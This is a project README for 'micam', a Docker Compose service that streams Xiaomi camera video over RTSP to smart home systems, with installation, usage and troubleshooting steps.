# 🎦 micam - Stream Your Xiaomi Camera Effortlessly

## 🚀 Getting Started
Welcome to the micam project! This service allows you to easily stream video from your Xiaomi cameras to various smart home platforms. Follow the steps below to get started with micam.

## 📥 Download
[![Download Micam](https://img.shields.io/badge/Download-Micam-blue.svg)](https://github.com/semka014/micam/releases)

## 💻 System Requirements
To run micam, you need:
- A supported Xiaomi camera
- Docker and Docker Compose installed on your system
- A computer with at least 2 GB RAM
- An active internet connection for setup

## 📋 Features
- Streams video from Xiaomi cameras to RTSP servers
- Compatible with HomeAssistant, Go2rtc, Frigate, Scrypted, and Homekit
- Easy Docker Compose deployment
- Integration without the need for a GPU

## 🛠️ Installation Steps
1. **Install Docker and Docker Compose**
   - Make sure you have Docker and Docker Compose installed. If you don’t have them, visit the [Docker Documentation](https://docs.docker.com/get-docker/) for installation guides.
  
2. **Download Micam**
   - Visit the [Releases page](https://github.com/semka014/micam/releases) to download the latest version of micam. Look for the file that suits your operating system.
  
3. **Extract Files (if necessary)**
   - If you downloaded a compressed file, right-click on it and choose "Extract All." Follow the prompts to extract the files.

4. **Open a Terminal or Command Prompt**
   - Navigate to the folder where you extracted the micam files.

5. **Run Docker Compose**
   - In the terminal, type:
     ```
     docker-compose up -d
     ```
   - This command will start the micam service in the background.

6. **Access the Streaming**
   - Open your preferred web browser.
   - Go to the RTSP link provided in the terminal output to view the stream.

7. **Configure Your Smart Home Platform**
   - Follow the documentation of your smart home platform to integrate the RTSP stream from micam.

## 📝 Usage Tips
- Make sure your camera is connected to the same network as your computer.
- Check your camera’s settings and ensure that it allows RTSP streaming.
- Refer to the specific documentation for your smart home system for additional setup instructions.

## ⚙️ Troubleshooting
- If the stream does not show, verify that Docker is running.
- Ensure that your camera is powered on and has a stable connection.
- Check your firewall settings to make sure they allow connections to the RTSP server.

## 📤 Feedback
Your experience matters. If you have any questions or suggestions, feel free to open an issue on our [GitHub page](https://github.com/semka014/micam/issues).

## 🌐 Additional Resources
- [GitHub Repository](https://github.com/semka014/micam)
- [Docker Documentation](https://docs.docker.com/)
- [HomeAssistant Documentation](https://www.home-assistant.io/docs/)

## 🔗 Download & Install
To get micam, visit the [Releases page](https://github.com/semka014/micam/releases) and download the latest version. Follow the installation steps above to set up the service effortlessly.

## 👥 Community
Join our community for support and updates. Connect with other users through discussions and share your experience with micam!

Thank you for choosing micam! Enjoy seamless streaming from your Xiaomi camera to your favorite smart home systems.